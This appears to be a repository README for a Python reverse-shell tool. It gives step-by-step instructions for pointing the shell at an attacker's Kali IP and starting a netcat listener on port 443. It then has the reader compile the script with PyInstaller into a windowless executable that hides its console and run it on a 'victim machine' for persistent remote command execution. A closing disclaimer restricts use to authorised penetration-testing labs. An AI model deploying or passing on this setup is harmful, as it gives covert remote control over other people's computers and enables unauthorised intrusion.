# Python Reverse Shell

## Overview
This Python script creates a reverse shell connection to a remote attacker-controlled machine. It continuously attempts to establish a connection with the attacker's IP and allows remote command execution.

## Features
- **Persistent Connection:** The script will keep trying to connect to the attacker's machine if the connection fails.
- **Remote Command Execution:** Once the connection is established, the attacker can execute commands remotely.
- **Directory Navigation:** Supports basic directory navigation (`cd`, `ls`, `pwd`).
- **Error Handling:** The script includes error handling to manage connection issues and command execution errors.

## Usage
### 1. Modify the Script
Edit the script and replace `IP` and `PORT` with the attacker's machine details:
```python
IP = "192.x.x.x"  # Change this to your Kali IP
PORT = 443          # Ensure this port is open on Kali
```

### 2. Run the Attacker's Listener on Kali:
Ensure you're listening on the specified port (443 in this case) on your Linux machine. You can use Netcat or any other listening tool:
```sh
nc -lvnp 443
```

### 3. Generate Executable
Install `pyinstaller` library:
```sh
pip install pyinstaller
```
Generate an executable using `pyinstaller`:
```sh
pyinstaller -F --clean -w shell.py
```
This will create an executable file without a console window.

### 4. Execute the Shell:
Run the generated executable on the victim machine. The shell will attempt to connect to your Kali machine on the specified IP and port.

### 5. Command Execution:
Once connected, you can issue commands such as ls, dir, cd, and any other system commands. The result will be sent back to your terminal.

To exit the shell, simply type `/exit`.

### 3. Test Connection Locally
Before deploying, you can test if the connection is successful using `connection_check.py`:
```python
python .\connection_check.py
```
Run this script on your target machine to verify that the connection can be established.

## ⚠ Disclaimer
Use this script only in controlled environments such as penetration testing labs, with explicit permission. Misuse of this tool for unauthorized access to systems is illegal and may result in severe consequences. **The risk is yours**.

